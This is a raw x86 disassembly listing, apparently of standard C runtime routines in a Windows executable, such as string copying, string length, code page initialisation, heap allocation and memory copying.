  42578d:	lea    edi,[ecx-0x3]
  425790:	jmp    0x425795
  425792:	lea    edi,[ecx-0x4]
  425795:	mov    ecx,DWORD PTR [esp+0xc]
  425799:	test   ecx,0x3
  42579f:	je     0x4257be
  4257a1:	mov    dl,BYTE PTR [ecx]
  4257a3:	add    ecx,0x1
  4257a6:	test   dl,dl
  4257a8:	je     0x425810
  4257aa:	mov    BYTE PTR [edi],dl
  4257ac:	add    edi,0x1
  4257af:	test   ecx,0x3
  4257b5:	jne    0x4257a1
  4257b7:	jmp    0x4257be
  4257b9:	mov    DWORD PTR [edi],edx
  4257bb:	add    edi,0x4
  4257be:	mov    edx,0x7efefeff
  4257c3:	mov    eax,DWORD PTR [ecx]
  4257c5:	add    edx,eax
  4257c7:	xor    eax,0xffffffff
  4257ca:	xor    eax,edx
  4257cc:	mov    edx,DWORD PTR [ecx]
  4257ce:	add    ecx,0x4
  4257d1:	test   eax,0x81010100
  4257d6:	je     0x4257b9
  4257d8:	test   dl,dl
  4257da:	je     0x425810
  4257dc:	test   dh,dh
  4257de:	je     0x425807
  4257e0:	test   edx,0xff0000
  4257e6:	je     0x4257fa
  4257e8:	test   edx,0xff000000
  4257ee:	je     0x4257f2
  4257f0:	jmp    0x4257b9
  4257f2:	mov    DWORD PTR [edi],edx
  4257f4:	mov    eax,DWORD PTR [esp+0x8]
  4257f8:	pop    edi
  4257f9:	ret    
  4257fa:	mov    WORD PTR [edi],dx
  4257fd:	mov    eax,DWORD PTR [esp+0x8]
  425801:	mov    BYTE PTR [edi+0x2],0x0
  425805:	pop    edi
  425806:	ret    
  425807:	mov    WORD PTR [edi],dx
  42580a:	mov    eax,DWORD PTR [esp+0x8]
  42580e:	pop    edi
  42580f:	ret    
  425810:	mov    BYTE PTR [edi],dl
  425812:	mov    eax,DWORD PTR [esp+0x8]
  425816:	pop    edi
  425817:	ret    
  425818:	int3   
  425819:	int3   
  42581a:	int3   
  42581b:	int3   
  42581c:	int3   
  42581d:	int3   
  42581e:	int3   
  42581f:	int3   
  425820:	mov    ecx,DWORD PTR [esp+0xc]
  425824:	push   edi
  425825:	test   ecx,ecx
  425827:	je     0x4258bf
  42582d:	push   esi
  42582e:	push   ebx
  42582f:	mov    ebx,ecx
  425831:	mov    esi,DWORD PTR [esp+0x14]
  425835:	test   esi,0x3
  42583b:	mov    edi,DWORD PTR [esp+0x10]
  42583f:	jne    0x42584c
  425841:	shr    ecx,0x2
  425844:	jne    0x4258cf
  42584a:	jmp    0x425873
  42584c:	mov    al,BYTE PTR [esi]
  42584e:	add    esi,0x1
  425851:	mov    BYTE PTR [edi],al
  425853:	add    edi,0x1
  425856:	sub    ecx,0x1
  425859:	je     0x425886
  42585b:	test   al,al
  42585d:	je     0x42588e
  42585f:	test   esi,0x3
  425865:	jne    0x42584c
  425867:	mov    ebx,ecx
  425869:	shr    ecx,0x2
  42586c:	jne    0x4258cf
  42586e:	and    ebx,0x3
  425871:	je     0x425886
  425873:	mov    al,BYTE PTR [esi]
  425875:	add    esi,0x1
  425878:	mov    BYTE PTR [edi],al
  42587a:	add    edi,0x1
  42587d:	test   al,al
  42587f:	je     0x4258b8
  425881:	sub    ebx,0x1
  425884:	jne    0x425873
  425886:	mov    eax,DWORD PTR [esp+0x10]
  42588a:	pop    ebx
  42588b:	pop    esi
  42588c:	pop    edi
  42588d:	ret    
  42588e:	test   edi,0x3
  425894:	je     0x4258ac
  425896:	mov    BYTE PTR [edi],al
  425898:	add    edi,0x1
  42589b:	sub    ecx,0x1
  42589e:	je     0x42593c
  4258a4:	test   edi,0x3
  4258aa:	jne    0x425896
  4258ac:	mov    ebx,ecx
  4258ae:	shr    ecx,0x2
  4258b1:	jne    0x425927
  4258b3:	mov    BYTE PTR [edi],al
  4258b5:	add    edi,0x1
  4258b8:	sub    ebx,0x1
  4258bb:	jne    0x4258b3
  4258bd:	pop    ebx
  4258be:	pop    esi
  4258bf:	mov    eax,DWORD PTR [esp+0x8]
  4258c3:	pop    edi
  4258c4:	ret    
  4258c5:	mov    DWORD PTR [edi],edx
  4258c7:	add    edi,0x4
  4258ca:	sub    ecx,0x1
  4258cd:	je     0x42586e
  4258cf:	mov    edx,0x7efefeff
  4258d4:	mov    eax,DWORD PTR [esi]
  4258d6:	add    edx,eax
  4258d8:	xor    eax,0xffffffff
  4258db:	xor    eax,edx
  4258dd:	mov    edx,DWORD PTR [esi]
  4258df:	add    esi,0x4
  4258e2:	test   eax,0x81010100
  4258e7:	je     0x4258c5
  4258e9:	test   dl,dl
  4258eb:	je     0x425919
  4258ed:	test   dh,dh
  4258ef:	je     0x42590f
  4258f1:	test   edx,0xff0000
  4258f7:	je     0x425905
  4258f9:	test   edx,0xff000000
  4258ff:	jne    0x4258c5
  425901:	mov    DWORD PTR [edi],edx
  425903:	jmp    0x42591d
  425905:	and    edx,0xffff
  42590b:	mov    DWORD PTR [edi],edx
  42590d:	jmp    0x42591d
  42590f:	and    edx,0xff
  425915:	mov    DWORD PTR [edi],edx
  425917:	jmp    0x42591d
  425919:	xor    edx,edx
  42591b:	mov    DWORD PTR [edi],edx
  42591d:	add    edi,0x4
  425920:	xor    eax,eax
  425922:	sub    ecx,0x1
  425925:	je     0x425933
  425927:	xor    eax,eax
  425929:	mov    DWORD PTR [edi],eax
  42592b:	add    edi,0x4
  42592e:	sub    ecx,0x1
  425931:	jne    0x425929
  425933:	and    ebx,0x3
  425936:	jne    0x4258b3
  42593c:	mov    eax,DWORD PTR [esp+0x10]
  425940:	pop    ebx
  425941:	pop    esi
  425942:	pop    edi
  425943:	ret    
  425944:	int3   
  425945:	int3   
  425946:	int3   
  425947:	int3   
  425948:	int3   
  425949:	int3   
  42594a:	int3   
  42594b:	int3   
  42594c:	int3   
  42594d:	int3   
  42594e:	int3   
  42594f:	int3   
  425950:	mov    ecx,DWORD PTR [esp+0x4]
  425954:	test   ecx,0x3
  42595a:	je     0x425980
  42595c:	mov    al,BYTE PTR [ecx]
  42595e:	add    ecx,0x1
  425961:	test   al,al
  425963:	je     0x4259b3
  425965:	test   ecx,0x3
  42596b:	jne    0x42595c
  42596d:	add    eax,0x0
  425972:	lea    esp,[esp+0x0]
  425979:	lea    esp,[esp+0x0]
  425980:	mov    eax,DWORD PTR [ecx]
  425982:	mov    edx,0x7efefeff
  425987:	add    edx,eax
  425989:	xor    eax,0xffffffff
  42598c:	xor    eax,edx
  42598e:	add    ecx,0x4
  425991:	test   eax,0x81010100
  425996:	je     0x425980
  425998:	mov    eax,DWORD PTR [ecx-0x4]
  42599b:	test   al,al
  42599d:	je     0x4259d1
  42599f:	test   ah,ah
  4259a1:	je     0x4259c7
  4259a3:	test   eax,0xff0000
  4259a8:	je     0x4259bd
  4259aa:	test   eax,0xff000000
  4259af:	je     0x4259b3
  4259b1:	jmp    0x425980
  4259b3:	lea    eax,[ecx-0x1]
  4259b6:	mov    ecx,DWORD PTR [esp+0x4]
  4259ba:	sub    eax,ecx
  4259bc:	ret    
  4259bd:	lea    eax,[ecx-0x2]
  4259c0:	mov    ecx,DWORD PTR [esp+0x4]
  4259c4:	sub    eax,ecx
  4259c6:	ret    
  4259c7:	lea    eax,[ecx-0x3]
  4259ca:	mov    ecx,DWORD PTR [esp+0x4]
  4259ce:	sub    eax,ecx
  4259d0:	ret    
  4259d1:	lea    eax,[ecx-0x4]
  4259d4:	mov    ecx,DWORD PTR [esp+0x4]
  4259d8:	sub    eax,ecx
  4259da:	ret    
  4259db:	push   0x8
  4259dd:	push   0x429650
  4259e2:	call   0x425340
  4259e7:	and    DWORD PTR [ebp-0x4],0x0
  4259eb:	push   0x0
  4259ed:	push   0x1
  4259ef:	call   0x427562
  4259f4:	pop    ecx
  4259f5:	pop    ecx
  4259f6:	jmp    0x4259ff
  4259f8:	xor    eax,eax
  4259fa:	inc    eax
  4259fb:	ret    
  4259fc:	mov    esp,DWORD PTR [ebp-0x18]
  4259ff:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a03:	push   0x3
  425a05:	call   DWORD PTR ds:0x429058
  425a0b:	int3   
  425a0c:	cmp    ecx,DWORD PTR ds:0x45d430
  425a12:	jne    0x425a15
  425a14:	ret    
  425a15:	jmp    0x4259db
  425a1a:	movzx  eax,BYTE PTR [esp+0x4]
  425a1f:	mov    cl,BYTE PTR [esp+0xc]
  425a23:	test   BYTE PTR [eax+0x45df21],cl
  425a29:	jne    0x425a47
  425a2b:	cmp    DWORD PTR [esp+0x8],0x0
  425a30:	je     0x425a40
  425a32:	movzx  eax,WORD PTR [eax*2+0x429a4a]
  425a3a:	and    eax,DWORD PTR [esp+0x8]
  425a3e:	jmp    0x425a42
  425a40:	xor    eax,eax
  425a42:	test   eax,eax
  425a44:	jne    0x425a47
  425a46:	ret    
  425a47:	xor    eax,eax
  425a49:	inc    eax
  425a4a:	ret    
  425a4b:	push   0x4
  425a4d:	push   0x0
  425a4f:	push   DWORD PTR [esp+0xc]
  425a53:	call   0x425a1a
  425a58:	add    esp,0xc
  425a5b:	ret    
  425a5c:	sub    eax,0x3a4
  425a61:	je     0x425a85
  425a63:	sub    eax,0x4
  425a66:	je     0x425a7f
  425a68:	sub    eax,0xd
  425a6b:	je     0x425a79
  425a6d:	dec    eax
  425a6e:	je     0x425a73
  425a70:	xor    eax,eax
  425a72:	ret    
  425a73:	mov    eax,0x404
  425a78:	ret    
  425a79:	mov    eax,0x412
  425a7e:	ret    
  425a7f:	mov    eax,0x804
  425a84:	ret    
  425a85:	mov    eax,0x411
  425a8a:	ret    
  425a8b:	push   edi
  425a8c:	push   0x40
  425a8e:	xor    eax,eax
  425a90:	pop    ecx
  425a91:	mov    edi,0x45df20
  425a96:	rep stos DWORD PTR es:[edi],eax
  425a98:	stos   BYTE PTR es:[edi],al
  425a99:	xor    eax,eax
  425a9b:	mov    ds:0x45e024,eax
  425aa0:	mov    ds:0x45df1c,eax
  425aa5:	mov    ds:0x45df14,eax
  425aaa:	mov    edi,0x45e030
  425aaf:	stos   DWORD PTR es:[edi],eax
  425ab0:	stos   DWORD PTR es:[edi],eax
  425ab1:	stos   DWORD PTR es:[edi],eax
  425ab2:	pop    edi
  425ab3:	ret    
  425ab4:	push   ebp
  425ab5:	mov    ebp,esp
  425ab7:	sub    esp,0x518
  425abd:	mov    eax,ds:0x45d430
  425ac2:	xor    eax,DWORD PTR [ebp+0x4]
  425ac5:	push   esi
  425ac6:	mov    DWORD PTR [ebp-0x4],eax
  425ac9:	lea    eax,[ebp-0x18]
  425acc:	push   eax
  425acd:	push   DWORD PTR ds:0x45e024
  425ad3:	call   DWORD PTR ds:0x4290c4
  425ad9:	cmp    eax,0x1
  425adc:	mov    esi,0x100
  425ae1:	jne    0x425bf4
  425ae7:	xor    eax,eax
  425ae9:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425af0:	inc    eax
  425af1:	cmp    eax,esi
  425af3:	jb     0x425ae9
  425af5:	mov    al,BYTE PTR [ebp-0x12]
  425af8:	test   al,al
  425afa:	mov    BYTE PTR [ebp-0x118],0x20
  425b01:	je     0x425b39
  425b03:	push   ebx
  425b04:	lea    edx,[ebp-0x11]
  425b07:	push   edi
  425b08:	movzx  ecx,BYTE PTR [edx]
  425b0b:	movzx  eax,al
  425b0e:	cmp    eax,ecx
  425b10:	ja     0x425b2f
  425b12:	sub    ecx,eax
  425b14:	inc    ecx
  425b15:	mov    ebx,ecx
  425b17:	shr    ecx,0x2
  425b1a:	lea    edi,[ebp+eax*1-0x118]
  425b21:	mov    eax,0x20202020
  425b26:	rep stos DWORD PTR es:[edi],eax
  425b28:	mov    ecx,ebx
  425b2a:	and    ecx,0x3
  425b2d:	rep stos BYTE PTR es:[edi],al
  425b2f:	inc    edx
  425b30:	mov    al,BYTE PTR [edx]
  425b32:	inc    edx
  425b33:	test   al,al
  425b35:	jne    0x425b08
  425b37:	pop    edi
  425b38:	pop    ebx
  425b39:	push   0x0
  425b3b:	push   DWORD PTR ds:0x45df14
  425b41:	lea    eax,[ebp-0x518]
  425b47:	push   DWORD PTR ds:0x45e024
  425b4d:	push   eax
  425b4e:	push   esi
  425b4f:	lea    eax,[ebp-0x118]
  425b55:	push   eax
  425b56:	push   0x1
  425b58:	call   0x427a68
  425b5d:	push   0x0
  425b5f:	push   DWORD PTR ds:0x45e024
  425b65:	lea    eax,[ebp-0x218]
  425b6b:	push   esi
  425b6c:	push   eax
  425b6d:	push   esi
  425b6e:	lea    eax,[ebp-0x118]
  425b74:	push   eax
  425b75:	push   esi
  425b76:	push   DWORD PTR ds:0x45df14
  425b7c:	call   0x4276ac
  425b81:	push   0x0
  425b83:	push   DWORD PTR ds:0x45e024
  425b89:	lea    eax,[ebp-0x318]
  425b8f:	push   esi
  425b90:	push   eax
  425b91:	push   esi
  425b92:	lea    eax,[ebp-0x118]
  425b98:	push   eax
  425b99:	push   0x200
  425b9e:	push   DWORD PTR ds:0x45df14
  425ba4:	call   0x4276ac
  425ba9:	add    esp,0x5c
  425bac:	xor    eax,eax
  425bae:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425bb6:	test   cl,0x1
  425bb9:	je     0x425bd1
  425bbb:	or     BYTE PTR [eax+0x45df21],0x10
  425bc2:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425bc9:	mov    BYTE PTR [eax+0x45e040],cl
  425bcf:	jmp    0x425bed
  425bd1:	test   cl,0x2
  425bd4:	je     0x425be6
  425bd6:	or     BYTE PTR [eax+0x45df21],0x20
  425bdd:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425be4:	jmp    0x425bc9
  425be6:	and    BYTE PTR [eax+0x45e040],0x0
  425bed:	inc    eax
  425bee:	cmp    eax,esi
  425bf0:	jb     0x425bae
  425bf2:	jmp    0x425c38
  425bf4:	xor    eax,eax
  425bf6:	cmp    eax,0x41
  425bf9:	jb     0x425c14
  425bfb:	cmp    eax,0x5a
  425bfe:	ja     0x425c14
  425c00:	or     BYTE PTR [eax+0x45df21],0x10
  425c07:	mov    cl,al
  425c09:	add    cl,0x20
  425c0c:	mov    BYTE PTR [eax+0x45e040],cl
  425c12:	jmp    0x425c33
  425c14:	cmp    eax,0x61
  425c17:	jb     0x425c2c
  425c19:	cmp    eax,0x7a
  425c1c:	ja     0x425c2c
  425c1e:	or     BYTE PTR [eax+0x45df21],0x20
  425c25:	mov    cl,al
  425c27:	sub    cl,0x20
  425c2a:	jmp    0x425c0c
  425c2c:	and    BYTE PTR [eax+0x45e040],0x0
  425c33:	inc    eax
  425c34:	cmp    eax,esi
  425c36:	jb     0x425bf6
  425c38:	mov    ecx,DWORD PTR [ebp-0x4]
  425c3b:	xor    ecx,DWORD PTR [ebp+0x4]
  425c3e:	pop    esi
  425c3f:	call   0x425a0c
  425c44:	leave  
  425c45:	ret    
  425c46:	push   ebp
  425c47:	mov    ebp,esp
  425c49:	sub    esp,0x1c
  425c4c:	mov    eax,ds:0x45d430
  425c51:	xor    eax,DWORD PTR [ebp+0x4]
  425c54:	push   ebx
  425c55:	push   esi
  425c56:	mov    esi,DWORD PTR [ebp+0x8]
  425c59:	xor    ebx,ebx
  425c5b:	cmp    esi,ebx
  425c5d:	mov    DWORD PTR [ebp-0x4],eax
  425c60:	push   edi
  425c61:	je     0x425dbb
  425c67:	xor    edx,edx
  425c69:	xor    eax,eax
  425c6b:	cmp    DWORD PTR [eax+0x45d440],esi
  425c71:	je     0x425cd8
  425c73:	add    eax,0x30
  425c76:	inc    edx
  425c77:	cmp    eax,0xf0
  425c7c:	jb     0x425c6b
  425c7e:	lea    eax,[ebp-0x1c]
  425c81:	push   eax
  425c82:	push   esi
  425c83:	call   DWORD PTR ds:0x4290c4
  425c89:	cmp    eax,0x1
  425c8c:	jne    0x425db3
  425c92:	push   0x40
  425c94:	xor    eax,eax
  425c96:	cmp    DWORD PTR [ebp-0x1c],0x1
  425c9a:	pop    ecx
  425c9b:	mov    edi,0x45df20
  425ca0:	rep stos DWORD PTR es:[edi],eax
  425ca2:	stos   BYTE PTR es:[edi],al
  425ca3:	mov    DWORD PTR ds:0x45e024,esi
  425ca9:	mov    DWORD PTR ds:0x45df14,ebx
  425caf:	jbe    0x425da1
  425cb5:	cmp    BYTE PTR [ebp-0x16],0x0
  425cb9:	je     0x425d79
  425cbf:	lea    ecx,[ebp-0x15]
  425cc2:	mov    dl,BYTE PTR [ecx]
  425cc4:	test   dl,dl
  425cc6:	je     0x425d79
  425ccc:	movzx  eax,BYTE PTR [ecx-0x1]
  425cd0:	movzx  edx,dl
  425cd3:	jmp    0x425d69
  425cd8:	push   0x40
  425cda:	xor    eax,eax
  425cdc:	pop    ecx
  425cdd:	mov    edi,0x45df20
  425ce2:	rep stos DWORD PTR es:[edi],eax
  425ce4:	lea    ecx,[edx+edx*2]
  425ce7:	shl    ecx,0x4
  425cea:	mov    DWORD PTR [ebp-0x8],ebx
  425ced:	stos   BYTE PTR es:[edi],al
  425cee:	lea    ebx,[ecx+0x45d450]
  425cf4:	mov    al,BYTE PTR [ebx]
  425cf6:	mov    esi,ebx
  425cf8:	jmp    0x425d23
  425cfa:	mov    dl,BYTE PTR [esi+0x1]
  425cfd:	test   dl,dl
  425cff:	je     0x425d27
  425d01:	movzx  eax,al
  425d04:	movzx  edi,dl
  425d07:	cmp    eax,edi
  425d09:	ja     0x425d1f
  425d0b:	mov    edx,DWORD PTR [ebp-0x8]
  425d0e:	mov    dl,BYTE PTR [edx+0x45d438]
  425d14:	or     BYTE PTR [eax+0x45df21],dl
  425d1a:	inc    eax
  425d1b:	cmp    eax,edi
  425d1d:	jbe    0x425d14
  425d1f:	inc    esi
  425d20:	inc    esi
  425d21:	mov    al,BYTE PTR [esi]
  425d23:	test   al,al
  425d25:	jne    0x425cfa
  425d27:	inc    DWORD PTR [ebp-0x8]
  425d2a:	add    ebx,0x8
  425d2d:	cmp    DWORD PTR [ebp-0x8],0x4
  425d31:	jb     0x425cf4
  425d33:	mov    eax,DWORD PTR [ebp+0x8]
  425d36:	mov    ds:0x45e024,eax
  425d3b:	mov    DWORD PTR ds:0x45df1c,0x1
  425d45:	call   0x425a5c
  425d4a:	lea    ecx,[ecx+0x45d444]
  425d50:	mov    esi,ecx
  425d52:	mov    edi,0x45e030
  425d57:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d59:	mov    ds:0x45df14,eax
  425d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d5f:	jmp    0x425dc0
  425d61:	or     BYTE PTR [eax+0x45df21],0x4
  425d68:	inc    eax
  425d69:	cmp    eax,edx
  425d6b:	jbe    0x425d61
  425d6d:	inc    ecx
  425d6e:	inc    ecx
  425d6f:	cmp    BYTE PTR [ecx-0x1],0x0
  425d73:	jne    0x425cc2
  425d79:	xor    ecx,ecx
  425d7b:	inc    ecx
  425d7c:	mov    eax,ecx
  425d7e:	or     BYTE PTR [eax+0x45df21],0x8
  425d85:	inc    eax
  425d86:	cmp    eax,0xff
  425d8b:	jb     0x425d7e
  425d8d:	mov    eax,esi
  425d8f:	call   0x425a5c
  425d94:	mov    ds:0x45df14,eax
  425d99:	mov    DWORD PTR ds:0x45df1c,ecx
  425d9f:	jmp    0x425da7
  425da1:	mov    DWORD PTR ds:0x45df1c,ebx
  425da7:	xor    eax,eax
  425da9:	mov    edi,0x45e030
  425dae:	stos   DWORD PTR es:[edi],eax
  425daf:	stos   DWORD PTR es:[edi],eax
  425db0:	stos   DWORD PTR es:[edi],eax
  425db1:	jmp    0x425dc0
  425db3:	cmp    DWORD PTR ds:0x45dd84,ebx
  425db9:	je     0x425dc9
  425dbb:	call   0x425a8b
  425dc0:	call   0x425ab4
  425dc5:	xor    eax,eax
  425dc7:	jmp    0x425dcc
  425dc9:	or     eax,0xffffffff
  425dcc:	mov    ecx,DWORD PTR [ebp-0x4]
  425dcf:	xor    ecx,DWORD PTR [ebp+0x4]
  425dd2:	pop    edi
  425dd3:	pop    esi
  425dd4:	pop    ebx
  425dd5:	call   0x425a0c
  425dda:	leave  
  425ddb:	ret    
  425ddc:	push   0x14
  425dde:	push   0x429660
  425de3:	call   0x425340
  425de8:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425dec:	push   0xd
  425dee:	call   0x4254ff
  425df3:	pop    ecx
  425df4:	xor    edi,edi
  425df6:	mov    DWORD PTR [ebp-0x4],edi
  425df9:	mov    DWORD PTR ds:0x45dd84,edi
  425dff:	mov    eax,DWORD PTR [ebp+0x8]
  425e02:	cmp    eax,0xfffffffe
  425e05:	jne    0x425e19
  425e07:	mov    DWORD PTR ds:0x45dd84,0x1
  425e11:	call   DWORD PTR ds:0x4290c0
  425e17:	jmp    0x425e44
  425e19:	cmp    eax,0xfffffffd
  425e1c:	jne    0x425e30
  425e1e:	mov    DWORD PTR ds:0x45dd84,0x1
  425e28:	call   DWORD PTR ds:0x4290bc
  425e2e:	jmp    0x425e44
  425e30:	cmp    eax,0xfffffffc
  425e33:	jne    0x425e44
  425e35:	mov    DWORD PTR ds:0x45dd84,0x1
  425e3f:	mov    eax,ds:0x45ddb4
  425e44:	mov    DWORD PTR [ebp+0x8],eax
  425e47:	cmp    eax,DWORD PTR ds:0x45e024
  425e4d:	je     0x425f0e
  425e53:	mov    esi,DWORD PTR ds:0x45df18
  425e59:	mov    DWORD PTR [ebp-0x20],esi
  425e5c:	cmp    esi,edi
  425e5e:	je     0x425e64
  425e60:	cmp    DWORD PTR [esi],edi
  425e62:	je     0x425e74
  425e64:	push   0x220
  425e69:	call   0x426062
  425e6e:	pop    ecx
  425e6f:	mov    esi,eax
  425e71:	mov    DWORD PTR [ebp-0x20],esi
  425e74:	cmp    esi,edi
  425e76:	je     0x425ef7
  425e78:	push   DWORD PTR [ebp+0x8]
  425e7b:	call   0x425c46
  425e80:	pop    ecx
  425e81:	mov    DWORD PTR [ebp-0x1c],eax
  425e84:	cmp    eax,edi
  425e86:	jne    0x425ef7
  425e88:	mov    DWORD PTR [esi],edi
  425e8a:	mov    eax,ds:0x45e024
  425e8f:	mov    DWORD PTR [esi+0x4],eax
  425e92:	mov    eax,ds:0x45df1c
  425e97:	mov    DWORD PTR [esi+0x8],eax
  425e9a:	mov    eax,ds:0x45df14
  425e9f:	mov    DWORD PTR [esi+0xc],eax
  425ea2:	xor    eax,eax
  425ea4:	mov    DWORD PTR [ebp-0x24],eax
  425ea7:	cmp    eax,0x5
  425eaa:	jge    0x425ebc
  425eac:	mov    cx,WORD PTR [eax*2+0x45e030]
  425eb4:	mov    WORD PTR [esi+eax*2+0x10],cx
  425eb9:	inc    eax
  425eba:	jmp    0x425ea4
  425ebc:	xor    eax,eax
  425ebe:	mov    DWORD PTR [ebp-0x24],eax
  425ec1:	cmp    eax,0x101
  425ec6:	jge    0x425ed5
  425ec8:	mov    cl,BYTE PTR [eax+0x45df20]
  425ece:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425ed2:	inc    eax
  425ed3:	jmp    0x425ebe
  425ed5:	xor    eax,eax
  425ed7:	mov    DWORD PTR [ebp-0x24],eax
  425eda:	cmp    eax,0x100
  425edf:	jge    0x425ef1
  425ee1:	mov    cl,BYTE PTR [eax+0x45e040]
  425ee7:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425eee:	inc    eax
  425eef:	jmp    0x425ed7
  425ef1:	mov    DWORD PTR ds:0x45df18,esi
  425ef7:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425efb:	jne    0x425f11
  425efd:	cmp    esi,DWORD PTR ds:0x45df18
  425f03:	je     0x425f11
  425f05:	push   esi
  425f06:	call   0x425f4a
  425f0b:	pop    ecx
  425f0c:	jmp    0x425f11
  425f0e:	mov    DWORD PTR [ebp-0x1c],edi
  425f11:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f15:	call   0x425f23
  425f1a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f1d:	call   0x42537b
  425f22:	ret    
  425f23:	push   0xd
  425f25:	call   0x42546b
  425f2a:	pop    ecx
  425f2b:	ret    
  425f2c:	cmp    DWORD PTR ds:0x45e26c,0x0
  425f33:	jne    0x425f47
  425f35:	push   0xfffffffd
  425f37:	call   0x425ddc
  425f3c:	pop    ecx
  425f3d:	mov    DWORD PTR ds:0x45e26c,0x1
  425f47:	xor    eax,eax
  425f49:	ret    
  425f4a:	push   0xc
  425f4c:	push   0x429670
  425f51:	call   0x425340
  425f56:	mov    esi,DWORD PTR [ebp+0x8]
  425f59:	test   esi,esi
  425f5b:	je     0x425fb5
  425f5d:	cmp    DWORD PTR ds:0x45e144,0x3
  425f64:	jne    0x425fa6
  425f66:	push   0x4
  425f68:	call   0x4254ff
  425f6d:	pop    ecx
  425f6e:	and    DWORD PTR [ebp-0x4],0x0
  425f72:	push   esi
  425f73:	call   0x426722
  425f78:	pop    ecx
  425f79:	mov    DWORD PTR [ebp-0x1c],eax
  425f7c:	test   eax,eax
  425f7e:	je     0x425f89
  425f80:	push   esi
  425f81:	push   eax
  425f82:	call   0x42674d
  425f87:	pop    ecx
  425f88:	pop    ecx
  425f89:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f8d:	call   0x425f9d
  425f92:	cmp    DWORD PTR [ebp-0x1c],0x0
  425f96:	jne    0x425fb5
  425f98:	push   DWORD PTR [ebp+0x8]
  425f9b:	jmp    0x425fa7
  425f9d:	push   0x4
  425f9f:	call   0x42546b
  425fa4:	pop    ecx
  425fa5:	ret    
  425fa6:	push   esi
  425fa7:	push   0x0
  425fa9:	push   DWORD PTR ds:0x45e140
  425faf:	call   DWORD PTR ds:0x42902c
  425fb5:	call   0x42537b
  425fba:	ret    
  425fbb:	push   0xc
  425fbd:	push   0x429680
  425fc2:	call   0x425340
  425fc7:	mov    esi,DWORD PTR [ebp+0x8]
  425fca:	cmp    DWORD PTR ds:0x45e144,0x3
  425fd1:	jne    0x426001
  425fd3:	cmp    esi,DWORD PTR ds:0x45df04
  425fd9:	ja     0x426001
  425fdb:	push   0x4
  425fdd:	call   0x4254ff
  425fe2:	pop    ecx
  425fe3:	and    DWORD PTR [ebp-0x4],0x0
  425fe7:	push   esi
  425fe8:	call   0x426f01
  425fed:	pop    ecx
  425fee:	mov    DWORD PTR [ebp-0x1c],eax
  425ff1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425ff5:	call   0x42602d
  425ffa:	mov    eax,DWORD PTR [ebp-0x1c]
  425ffd:	test   eax,eax
  425fff:	jne    0x426024
  426001:	test   esi,esi
  426003:	jne    0x426006
  426005:	inc    esi
  426006:	cmp    DWORD PTR ds:0x45e144,0x1
  42600d:	je     0x426015
  42600f:	add    esi,0xf
  426012:	and    esi,0xfffffff0
  426015:	push   esi
  426016:	push   0x0
  426018:	push   DWORD PTR ds:0x45e140
  42601e:	call   DWORD PTR ds:0x429030
  426024:	call   0x42537b
  426029:	ret    
  42602a:	mov    esi,DWORD PTR [ebp+0x8]
  42602d:	push   0x4
  42602f:	call   0x42546b
  426034:	pop    ecx
  426035:	ret    
  426036:	cmp    DWORD PTR [esp+0x4],0xffffffe0
  42603b:	ja     0x42605f
  42603d:	push   DWORD PTR [esp+0x4]
  426041:	call   0x425fbb
  426046:	test   eax,eax
  426048:	pop    ecx
  426049:	jne    0x426061
  42604b:	cmp    DWORD PTR [esp+0x8],eax
  42604f:	je     0x426061
  426051:	push   DWORD PTR [esp+0x4]
  426055:	call   0x427c22
  42605a:	test   eax,eax
  42605c:	pop    ecx
  42605d:	jne    0x42603d
  42605f:	xor    eax,eax
  426061:	ret    
  426062:	push   DWORD PTR ds:0x45ddc8
  426068:	push   DWORD PTR [esp+0x8]
  42606c:	call   0x426036
  426071:	pop    ecx
  426072:	pop    ecx
  426073:	ret    
  426074:	int3   
  426075:	int3   
  426076:	int3   
  426077:	int3   
  426078:	int3   
  426079:	int3   
  42607a:	int3   
  42607b:	int3   
  42607c:	int3   
  42607d:	int3   
  42607e:	int3   
  42607f:	int3   
  426080:	push   ebp
  426081:	mov    ebp,esp
  426083:	push   edi
  426084:	push   esi
  426085:	mov    esi,DWORD PTR [ebp+0xc]
  426088:	mov    ecx,DWORD PTR [ebp+0x10]
  42608b:	mov    edi,DWORD PTR [ebp+0x8]
  42608e:	mov    eax,ecx
  426090:	mov    edx,ecx
  426092:	add    eax,esi
  426094:	cmp    edi,esi
  426096:	jbe    0x4260a0
  426098:	cmp    edi,eax
  42609a:	jb     0x42621c
  4260a0:	test   edi,0x3
  4260a6:	jne    0x4260bc
  4260a8:	shr    ecx,0x2
  4260ab:	and    edx,0x3
  4260ae:	cmp    ecx,0x8
  4260b1:	jb     0x4260dc
  4260b3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4260b5:	jmp    DWORD PTR [edx*4+0x4261cc]
  4260bc:	mov    eax,edi
  4260be:	mov    edx,0x3
  4260c3:	sub    ecx,0x4
  4260c6:	jb     0x4260d4
  4260c8:	and    eax,0x3
  4260cb:	add    ecx,eax
  4260cd:	jmp    DWORD PTR [eax*4+0x4260e0]
  4260d4:	jmp    DWORD PTR [ecx*4+0x4261dc]
  4260db:	nop
  4260dc:	jmp    DWORD PTR [ecx*4+0x426160]
  4260e3:	nop
  4260e4:	lock pusha 
  4260e6:	inc    edx
  4260e7:	add    BYTE PTR [ecx+eiz*2],bl
  4260ea:	inc    edx
  4260eb:	add    BYTE PTR [eax+0x61],al
  4260ee:	inc    edx
  4260ef:	add    BYTE PTR [ebx],ah
  4260f1:	ror    DWORD PTR [edx-0x75f877fa],1
  4260f7:	inc    esi
  4260f8:	add    DWORD PTR [eax+0x468a0147],ecx
  4260fe:	add    al,cl
  426100:	jmp    0x289e907
  426105:	add    esi,0x3
  426108:	add    edi,0x3
